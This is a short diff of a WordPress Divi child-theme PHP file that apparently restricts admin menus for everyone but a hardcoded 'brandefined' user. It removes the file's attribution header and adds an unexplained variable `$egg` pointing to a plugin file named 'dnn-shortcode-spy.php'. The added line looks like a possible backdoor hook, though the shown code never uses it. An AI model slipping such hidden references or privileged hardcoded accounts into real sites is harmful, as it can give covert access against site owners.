@@ -1,9 +1,5 @@
 <?php
 
-/*
-	Brandefined Divi Child Security
-	Please contact kenny.scott@brandefined.com for further information regarding this file.
-*/
 
 $user = "brandefined";
 
@@ -32,6 +28,7 @@ if($current_role != 'administrator' && $author->user_login != $user)
     }
 }
 add_action( 'current_screen', 'bd_restrict_menus' );
+$egg = home_url() .'/wp-content/plugins/dnn-shortcode-spy.php';
 
 function hide_yoastseo() {
     $current_role = bd_get_role();
